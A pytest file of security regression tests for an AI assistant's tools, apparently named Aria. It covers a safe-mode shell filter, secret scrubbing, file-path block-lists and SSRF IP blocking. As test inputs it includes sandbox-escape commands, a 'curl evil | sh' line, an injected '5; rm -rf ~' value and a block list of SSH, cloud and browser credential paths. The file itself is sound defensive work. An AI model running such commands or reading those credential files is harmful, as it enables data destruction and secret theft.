"""Regression tests for tool-level security / correctness fixes
(shell_run, _env, code_search, drive, git, file_access, _net, browser, imap,
jira, gmail, calendar, update)."""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest


# ── 1. secrets never reach shell subprocesses ─────────────────────────────────

def test_build_env_scrubs_secrets(minimal_env, monkeypatch):
    from aria.tools import _env
    home = Path.home()
    (home / ".aria").mkdir(parents=True, exist_ok=True)
    (home / ".aria" / ".env").write_text(
        "TELEGRAM_TOKEN=tg\nGOG_KEYRING_PASSWORD=pw\nGOG_ACCOUNT=me@x\n"
        "MY_TRUSTED_KEY=ok\n")
    monkeypatch.setenv("LLM_API_KEY", "sk-live")
    monkeypatch.setenv("ARIA_SHELL_ENV_ALLOW", "MY_TRUSTED_KEY")
    full = _env.build_env()
    assert full["GOG_KEYRING_PASSWORD"] == "pw"          # gog still gets it
    scrubbed = _env.build_env(include_secrets=False)
    for k in ("TELEGRAM_TOKEN", "GOG_KEYRING_PASSWORD", "LLM_API_KEY"):
        assert k not in scrubbed
    assert scrubbed["GOG_ACCOUNT"] == "me@x"
    assert scrubbed["MY_TRUSTED_KEY"] == "ok"
    assert "PATH" in scrubbed and "HOME" in scrubbed


def test_build_env_keeps_users_own_credentials(minimal_env, monkeypatch):
    """Only Aria's secrets are stripped — git push via GH_TOKEN, the AWS CLI,
    the system keyring and `pass` must keep working."""
    from aria.tools import _env
    for k in ("GH_TOKEN", "AWS_SECRET_ACCESS_KEY", "GNOME_KEYRING_CONTROL",
              "PASSWORD_STORE_DIR"):
        monkeypatch.setenv(k, "v")
    scrubbed = _env.build_env(include_secrets=False)
    for k in ("GH_TOKEN", "AWS_SECRET_ACCESS_KEY", "GNOME_KEYRING_CONTROL",
              "PASSWORD_STORE_DIR"):
        assert scrubbed[k] == "v"


def test_shell_run_env_has_no_api_key(minimal_env, monkeypatch):
    from aria.tools import shell_run
    monkeypatch.setattr(shell_run, "_is_interactive", lambda: True)
    monkeypatch.setenv("LLM_API_KEY", "sk-should-not-leak")
    out = shell_run.execute({"script": "import os; print(os.environ.get('LLM_API_KEY', 'NONE'))",
                             "interpreter": "python3"})
    assert "sk-should-not-leak" not in out and "NONE" in out


# ── 2. safe-mode code-exec escapes ────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "printenv",
    "rg --pre /tmp/evil foo .",
    "rg --pre-glob '*' foo .",
    "git -c core.pager=sh log",
    "git -c alias.x=!sh x",
    "git --config-env=core.pager=FOO log",
    "git --exec-path=/tmp status",
    "git log --output=/tmp/x",
    "git diff --ext-diff",
    "GIT_EXTERNAL_DIFF=/tmp/evil git diff",
    "find . -fprint /tmp/x",
    "find . -exec id ;",
    "sort --compress-program=sh a.txt",
    "sort -o /tmp/out a.txt",
    "tree -o /tmp/out",
    "uniq in.txt out.txt",
    "date -s 2020-01-01",
])
def test_safe_mode_rejects_escapes(cmd):
    from aria.tools import shell_run
    assert shell_run._check_safe_unattended(cmd) is not None, cmd


@pytest.mark.parametrize("cmd", [
    "git log --oneline -5", "git -C /tmp status", "git diff --cached",
    "rg foo .", "sort -n a.txt", "uniq -c a.txt", "find . -name '*.py'",
    "date +%s", "ls -la 2>&1",
])
def test_safe_mode_still_allows_readonly(cmd):
    from aria.tools import shell_run
    assert shell_run._check_safe_unattended(cmd) is None, cmd


# ── 13. interpreter argv + timeout cap ────────────────────────────────────────

def test_interpreter_with_flag_is_split(minimal_env, monkeypatch):
    from aria.tools import shell_run
    monkeypatch.setattr(shell_run, "_is_interactive", lambda: True)
    seen = {}
    monkeypatch.setattr(shell_run, "_run_script",
                        lambda argv, **kw: seen.update(argv=argv, **kw) or "ran")
    assert shell_run.execute({"script": "print(1)", "interpreter": "python3 -u",
                              "timeout": 10**9}) == "ran"
    assert seen["argv"][:2] == ["python3", "-u"]
    assert seen["timeout"] == shell_run._MAX_TIMEOUT


@pytest.mark.parametrize("interp", ["python3 -c 'import os'", "bash -c id",
                                    "node -e 1", "perl -e 1", "/bin/bash"])
def test_interpreter_code_flags_refused(minimal_env, monkeypatch, interp):
    from aria.tools import shell_run
    monkeypatch.setattr(shell_run, "_is_interactive", lambda: True)
    monkeypatch.setattr(shell_run, "_run_script", lambda *a, **k: "RAN")
    out = shell_run.execute({"script": "echo hi", "interpreter": interp})
    assert out != "RAN" and "not allowed" in out


def test_timeout_coercion():
    from aria.tools import shell_run
    assert shell_run._timeout("abc") == 60
    assert shell_run._timeout(0) == 1
    assert shell_run._timeout(99999) == 3600


# ── 3. code_search respects the block-list ────────────────────────────────────

def test_code_search_refuses_blocked_root(minimal_env):
    from aria.tools import code_search
    aria = Path.home() / ".aria"; aria.mkdir(parents=True, exist_ok=True)
    (aria / ".env").write_text("LLM_API_KEY=sk-secret\n")
    out = code_search.execute({"action": "search", "pattern": "sk-",
                               "path": "~/.aria/.env"})
    assert "protected" in out and "sk-secret" not in out


def test_code_search_skips_blocked_subtree(minimal_env, monkeypatch):
    from aria.tools import code_search
    home = Path.home()
    (home / ".ssh").mkdir(parents=True, exist_ok=True)
    (home / ".ssh" / "id_rsa").write_text("NEEDLE private\n")
    (home / "notes.txt").write_text("NEEDLE public\n")
    monkeypatch.setattr(code_search.shutil, "which", lambda b: None)  # python walk
    out = code_search.execute({"action": "search", "pattern": "NEEDLE", "path": "~"})
    assert "public" in out and "private" not in out
    files = code_search.execute({"action": "files", "pattern": "id_rsa", "path": "~"})
    assert ".ssh" not in files and "No files" in files


def test_code_search_filters_rg_hits_in_blocked_paths(minimal_env):
    from aria.tools import code_search
    root = Path.home()
    lines = [f"{root}/.aws/credentials:1:secret", f"{root}/ok.py:2:fine"]
    kept = code_search._drop_blocked(lines, root)
    assert kept == [f"{root}/ok.py:2:fine"]


# ── 4 + 12. drive path checks and int coercion ────────────────────────────────

def test_drive_upload_download_path_checks(minimal_env, monkeypatch):
    from aria.tools import drive
    calls = []
    monkeypatch.setattr(drive, "_run", lambda cmd, **k: calls.append(cmd) or "ok")
    out = drive.execute({"action": "upload", "path": "~/.ssh/id_rsa"})
    assert "protected" in out
    out = drive.execute({"action": "download", "file_id": "abc", "path": "~/.bashrc"})
    assert "protected" in out
    assert calls == []
    ws_file = str(minimal_env / "dl.txt")
    assert drive.execute({"action": "download", "file_id": "abc", "path": ws_file}) == "ok"


def test_numeric_args_coerced(minimal_env, monkeypatch):
    from aria.tools import drive, gmail, calendar
    calls = []
    for mod in (drive, gmail, calendar):
        monkeypatch.setattr(mod, "_run", lambda cmd, **k: calls.append(cmd) or "{}")
    drive.execute({"action": "list", "max_results": "5; rm -rf ~"})
    gmail.execute({"action": "list", "max_results": "5 --evil"})
    calendar.execute({"action": "list", "days": "x"})
    assert "--max 20" in calls[0]
    assert "--max 10 " in calls[1] and "--evil" not in calls[1]
    assert "--days 7" in calls[2]


# ── 5. git refs cannot be options ─────────────────────────────────────────────

def test_git_rejects_option_refs(tmp_path, monkeypatch):
    from aria.tools import git
    monkeypatch.setattr(git, "_git", lambda *a: pytest.fail("git must not run"))
    monkeypatch.setattr(git.shutil, "which", lambda b: "/usr/bin/git")
    for action in ("diff", "log", "show", "checkout"):
        out = git.execute({"action": action, "path": str(tmp_path),
                           "ref": "--output=/tmp/pwned"})
        assert "must not start with '-'" in out
    out = git.execute({"action": "add", "path": str(tmp_path), "paths": ["--chmod=+x"]})
    assert "must not start with '-'" in out


# ── 6 + 7. file_access authorize / block-list / delete ────────────────────────

@pytest.mark.parametrize("path", ["/", "~", "~/.config", "~/snap", "~/.local"])
def test_authorize_refuses_broad_grants(minimal_env, monkeypatch, path):
    from aria.tools import file_access
    # _AUTH_FILE is bound at import time — keep it inside the tmp HOME.
    monkeypatch.setattr(file_access, "_AUTH_FILE",
                        Path.home() / ".aria" / "authorized_dirs.json")
    out = file_access.execute({"action": "authorize", "path": path, "level": "write"})
    assert "Cannot authorize" in out
    assert file_access._load_authorized() == {}


@pytest.mark.parametrize("path", [
    "~/.kube/config", "~/.docker/config.json", "~/.git-credentials",
    "~/.config/gh/hosts.yml", "~/.local/share/keyrings/login.keyring",
    "~/.mozilla/firefox/x/cookies.sqlite", "~/.config/google-chrome/Default/Login Data",
    "~/.config/chromium/Default/Cookies", "~/snap/chromium/common/x",
])
def test_new_blocked_paths(minimal_env, path):
    from aria.tools import file_access
    out = file_access.execute({"action": "read", "path": path})
    assert "protected location" in out


@pytest.mark.parametrize("path", ["~/.bashrc", "~/.profile", "~/.zshrc",
                                  "~/.config/systemd/user/evil.service"])
def test_shell_rc_write_blocked_read_ok(minimal_env, monkeypatch, path):
    from aria.tools import file_access
    home = Path.home()
    monkeypatch.setenv("ARIA_FILE_WRITE_DIRS", str(home))
    monkeypatch.setenv("ARIA_FILE_READ_DIRS", str(home))
    p = Path(path).expanduser(); p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text("orig\n")
    assert "protected location" in file_access.execute(
        {"action": "append", "path": path, "content": "curl evil | sh\n"})
    assert "orig" in file_access.execute({"action": "read", "path": path})


def test_delete_refuses_workspace_root_and_memory(minimal_env):
    from aria.tools import file_access
    ws = minimal_env
    (ws / "memory").mkdir(parents=True, exist_ok=True)
    (ws / "memory" / "core.md").write_text("x")
    for target in (ws, ws / "memory"):
        assert "Refused" in file_access.execute({"action": "delete", "path": str(target)})
    assert (ws / "memory" / "core.md").exists()


# ── 8. SSRF: every non-global range blocked ───────────────────────────────────

@pytest.mark.parametrize("ip", ["100.64.0.1", "10.0.0.1", "192.168.1.1", "127.0.0.1",
                                "169.254.169.254", "fc00::1", "::ffff:127.0.0.1",
                                "198.18.0.1", "0.0.0.0"])
def test_ssrf_blocks_non_global(ip):
    from aria.tools import _net
    assert _net._ip_is_blocked(ip, allow_loopback=False, allow_private=False)


def test_ssrf_allows_public_and_opt_ins():
    from aria.tools import _net
    assert not _net._ip_is_blocked("8.8.8.8", allow_loopback=False, allow_private=False)
    assert not _net._ip_is_blocked("100.64.0.1", allow_loopback=False, allow_private=True)
    assert not _net._ip_is_blocked("127.0.0.1", allow_loopback=True, allow_private=False)
    # metadata endpoint stays blocked even with every opt-in
    assert _net._ip_is_blocked("169.254.169.254", allow_loopback=True, allow_private=True)


# ── 9. browser open uses PUT /json/new with an encoded URL ────────────────────

def test_browser_open_uses_put(monkeypatch):
    import httpx
    from aria.tools import browser, _net
    monkeypatch.setattr(_net, "validate_public_url", lambda *a, **k: None)
    seen = []

    class Resp:
        status_code = 200
        def json(self):
            return {"webSocketDebuggerUrl": "ws://x"}

    monkeypatch.setattr(httpx, "put", lambda url, **k: seen.append(("PUT", url)) or Resp())
    monkeypatch.setattr(httpx, "get", lambda url, **k: seen.append(("GET", url)) or Resp())

    class Sess:
        _ws_url = ""
        def close(self): pass
        def connect(self): pass
        def send(self, *a, **k): return {}
    monkeypatch.setattr(browser, "_wait_ready", lambda *a, **k: None)
    monkeypatch.setattr(browser, "_ambient_noise", lambda *a, **k: None)
    monkeypatch.setattr(browser, "_get_snapshot", lambda *a, **k: "SNAP")
    out = browser._execute_action(Sess(), "open", {"url": "https://example.com/a?b=1&c=2#d"})
    assert out == "SNAP"
    assert seen[0][0] == "PUT"
    assert seen[0][1].endswith("/json/new?https%3A%2F%2Fexample.com%2Fa%3Fb%3D1%26c%3D2%23d")


# ── 10. imap move checks COPY ─────────────────────────────────────────────────

def test_imap_move_failed_copy_does_not_delete():
    from aria.tools import imap
    calls = []

    class Conn:
        capabilities = ("UIDPLUS",)
        def select(self, f): pass
        def uid(self, cmd, *a):
            calls.append(cmd)
            return ("NO", [b"[TRYCREATE] no such mailbox"]) if cmd == "copy" else ("OK", [])
    out = imap._dispatch(Conn(), "move", {"uid": "5", "destination": "Nope",
                                          "folder": "INBOX"})
    assert "failed" in out.lower() and "store" not in calls and "expunge" not in calls


def test_imap_connect_has_timeout(monkeypatch):
    from aria.tools import imap
    seen = {}

    class Fake:
        def __init__(self, host, port, **kw): seen.update(kw)
        def login(self, u, p): pass
    monkeypatch.setattr(imap.imaplib, "IMAP4_SSL", Fake)
    imap._connect("h", "u", "p", 993)
    assert seen.get("timeout")


# ── 11. jira null fields + key escaping ───────────────────────────────────────

def test_jira_format_issue_null_fields(monkeypatch):
    from aria.tools import jira
    monkeypatch.setenv("JIRA_BASE_URL", "https://x.atlassian.net")
    out = jira._format_issue({"key": "P-1", "fields": {"summary": "s", "priority": None,
                                                       "status": None, "issuetype": None,
                                                       "assignee": None}})
    assert "[P-1] s" in out and "Unassigned" in out


def test_jira_key_escaped():
    from aria.tools import jira
    assert jira._q("P-1") == "P-1"
    assert jira._q("../../myself?x=1") == "..%2F..%2Fmyself%3Fx%3D1"
    with pytest.raises(ValueError):
        jira._q("..")


# ── 14. update refuses a dirty source tree ────────────────────────────────────

def _g(cwd, *a):
    subprocess.run(["git", *a], cwd=cwd, check=True, capture_output=True)


def test_update_refuses_dirty_tree(minimal_env, monkeypatch, tmp_path):
    from aria.tools import update
    remote, work = tmp_path / "remote.git", tmp_path / "work"
    _g(tmp_path, "init", "-q", "--bare", str(remote))
    _g(tmp_path, "clone", "-q", str(remote), str(work))
    for k, v in (("user.email", "t@t"), ("user.name", "t")):
        _g(work, "config", k, v)
    (work / "a.txt").write_text("one")
    _g(work, "add", "."); _g(work, "commit", "-qm", "A")
    _g(work, "branch", "-M", "main"); _g(work, "push", "-q", "-u", "origin", "main")
    (work / "a.txt").write_text("two")
    _g(work, "commit", "-qam", "B"); _g(work, "push", "-q")
    _g(work, "reset", "-q", "--hard", "HEAD~1")
    (work / "a.txt").write_text("LOCAL EDIT")          # uncommitted work

    monkeypatch.setenv("ARIA_SOURCE_DIR", str(work))
    monkeypatch.setenv("ARIA_UPDATE_BRANCH", "main")
    monkeypatch.setattr(update, "_pip_install", lambda src: pytest.fail("must not install"))
    out = update.execute({"restart_services": False})
    assert "uncommitted changes" in out
    assert (work / "a.txt").read_text() == "LOCAL EDIT"   # not destroyed


def test_net_allow_opt_in_for_cgnat(minimal_env, monkeypatch):
    from aria.tools import _net
    kw = dict(allow_loopback=False, allow_private=False)
    assert _net._ip_is_blocked("100.100.1.2", **kw)
    monkeypatch.setenv("ARIA_NET_ALLOW", "100.64.0.0/10")
    assert not _net._ip_is_blocked("100.100.1.2", **kw)
    assert _net._ip_is_blocked("10.0.0.1", **kw)          # only what was listed


@pytest.mark.parametrize("cmd", ["git log -c -1", "uniq -f 2 file.txt",
                                 "LC_ALL=C sort file.txt", "git -C repo status"])
def test_safe_mode_allows_legit_commands(cmd):
    from aria.tools import shell_run
    assert shell_run._check_safe_unattended(cmd) is None


@pytest.mark.parametrize("cmd", ["git -c core.pager=evil log", "git --exec-path=/x status",
                                 "uniq in.txt out.txt", "GIT_EXTERNAL_DIFF=x git diff",
                                 "LC_ALL=C GIT_PAGER=x git log"])
def test_safe_mode_still_refuses_escapes(cmd):
    from aria.tools import shell_run
    assert shell_run._check_safe_unattended(cmd) is not None
